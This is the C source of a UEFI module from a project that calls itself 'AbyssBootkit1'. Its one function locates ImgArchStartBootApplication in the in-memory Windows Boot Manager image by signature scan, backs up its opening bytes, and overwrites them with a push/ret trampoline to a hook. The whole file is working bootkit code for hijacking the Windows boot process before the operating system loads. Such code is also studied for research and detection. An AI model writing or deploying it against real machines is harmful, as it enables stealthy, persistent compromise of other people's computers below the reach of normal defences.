// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Patch/Hook Windows Boot Manager
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils05Pattern.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils06Address.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils07PortableExecutable.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils10Signatures.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks01BootmgfwEfi1ImgArchStartBootApplication.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Patch to Windows Boot Manager (bootmgfw.efi) image.
	@details        This function applies a custom patch to modify the behavior of the Windows Boot Manager.


	@param[in]      ImageBase                   A pointer to the base address of the loaded image.
	@param[in]      ImageSize                   The size, in bytes, of the loaded image.


	@retval         EFI_SUCCESS                 The patch was successfully applied.
	@retval         EFI_NOT_FOUND               The necesarry functions were not found.
	@retval         other                       An error occurred during the patching process.
**/
EFI_STATUS
BootWindowsHookings_FunctionsWindowsBootManager_PatchBootmgfwEfi(
	IN              VOID*                       ImageBase,
	IN              UINTN                       ImageSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	UINT16 MajorVersion = 0, MinorVersion = 0, BuildNumber = 0, Revision = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Get NT Headers
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Get NT Headers\r\n");

	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile(ImageBase, ImageSize);

	// Failed
	if (NtHeaders == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile failed.\r\n");

		return EFI_LOAD_ERROR;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get version info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Get version info\r\n");

	Status = BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile(ImageBase, &MajorVersion, &MinorVersion, &BuildNumber, &Revision, NULL);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile failed: %r (%llx).\r\n", Status, Status);

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Print info Bootmgfw.efi v%u.%u.%u.%u\r\n", MajorVersion, MinorVersion, BuildNumber, Revision);


	// ---------------------------------------------------------------------------------------------------------------------
	// Find code section
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Find code section\r\n");

	CONST PEFI_IMAGE_SECTION_HEADER CodeSection = IMAGE_FIRST_SECTION(NtHeaders);


	// ---------------------------------------------------------------------------------------------------------------------
	// Find ImgArchStartBootApplication signature
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Find ImgArchStartBootApplication signature\r\n");

	UINT8* Found = NULL;
	Status = BootWindowsHookings_UtilsPattern_FindPattern(Global_BootWindowsHookings_SigImgArchStartBootApplication, 0xCC, sizeof(Global_BootWindowsHookings_SigImgArchStartBootApplication), (UINT8*)ImageBase + CodeSection->VirtualAddress, CodeSection->SizeOfRawData, (VOID**)&Found);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - BootWindowsHookings_UtilsPattern_FindPattern failed: %r (%llx).\r\n", Status, Status);

		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Find ImgArchStartBootApplication start
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Find ImgArchStartBootApplication start\r\n");

	Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer = (VOID*)BootWindowsHookings_UtilsAddress_FindStartAddress(ImageBase, NtHeaders, Found);

	// Failed
	if (Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - BootWindowsHookings_UtilsAddress_FindStartAddress failed: %r (%llx).\r\n", Status, Status);

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Hook bootmgfw.efi!ImgArchStartBootApplication
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Hook bootmgfw.efi!ImgArchStartBootApplication\r\n");

	VOID* HookAddress = (VOID*)&BootWindowsHookings_HooksBootmgfwEfi_ImgArchStartBootApplication;


	// ---------------------------------------------------------------------------------------------------------------------
	// Raise TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Raise TPL\r\n");

	// Raises a task’s priority level and returns its previous level.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-raisetpl
	EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy ImgArchStartBootApplication bytes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Copy ImgArchStartBootApplication bytes\r\n");

	// Copies a source buffer to a destination buffer, and returns the destination buffer.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
	CopyMem(Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationBackupBytes, Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function\r\n");

	// Place hook template in original address
	BootWindowsHookings_UtilsMemory_CopyMemory(Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer, Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Place HookAddress in template
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Place HookAddress in template\r\n");

	BootWindowsHookings_UtilsMemory_CopyMemory((UINT8*)Global_BootWindowsHookings_UtilsHooks_BootmgfwEfiImgArchStartBootApplicationOriginalPointer + Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplateAddressOffset, (UINTN*)&HookAddress, sizeof(UINTN));


	// ---------------------------------------------------------------------------------------------------------------------
	// Restore TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Restore TPL\r\n");

	// Restores a task’s priority level to its previous value.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-restoretpl
	gBS->RestoreTPL(Tpl);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsBootManager.c] (PatchBootmgfwEfi) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
